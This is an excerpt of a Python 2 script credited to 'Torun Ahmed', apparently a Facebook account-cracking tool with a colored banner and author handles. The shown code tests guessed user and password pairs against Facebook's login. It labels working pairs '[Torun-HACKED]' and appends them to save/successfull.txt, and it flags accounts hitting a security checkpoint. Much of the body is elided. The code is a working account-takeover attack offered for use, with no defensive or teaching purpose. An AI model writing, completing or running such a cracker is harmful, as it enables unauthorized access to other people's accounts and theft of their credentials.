#Tools Created By Torun Ahmed 
#Torun Technology Channel
...
\033[0;96m   __| | | | | |    /| | | | . ` |
\033[0;96m   |_| | \ \_/ / |\ \| |_| | |\  |
\033[0;96m  __\_/  \___/\_| \_|\___/\_| \_/
""")

print("\033[0;91mThis Tool's Free By Torun Ahmed")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : Torun ahmed'
    print '\033[0;94mFACEBOOK : Torun king'
    print '\033[0;96mGITHUB   : Torunking'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Torun-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Torun-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
